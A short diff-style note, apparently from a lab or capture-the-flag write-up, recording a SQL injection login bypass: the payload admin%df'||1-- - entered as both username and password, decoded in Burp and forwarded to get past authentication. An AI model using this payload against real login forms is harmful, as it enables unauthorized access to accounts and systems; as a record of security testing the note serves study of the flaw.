@@ -1,0 +1,5 @@
+>>>username: admin%df'||1-- -
+>>>password: admin%df'||1-- -
+
+they were url encoded;
+i decoded them in burp and forwarded the request and it got bypassed
